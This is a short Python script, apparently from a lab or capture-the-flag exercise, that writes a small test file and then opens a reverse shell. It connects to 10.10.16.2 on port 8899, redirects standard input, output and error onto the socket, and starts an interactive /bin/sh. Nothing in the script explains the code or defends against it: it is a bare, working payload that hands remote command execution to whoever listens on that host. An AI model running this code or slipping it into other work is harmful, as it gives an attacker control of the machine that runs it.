import socket,subprocess,os

f = open("test.txt", "w")
f.write("testing 123!")
f.close

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.2",8899))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])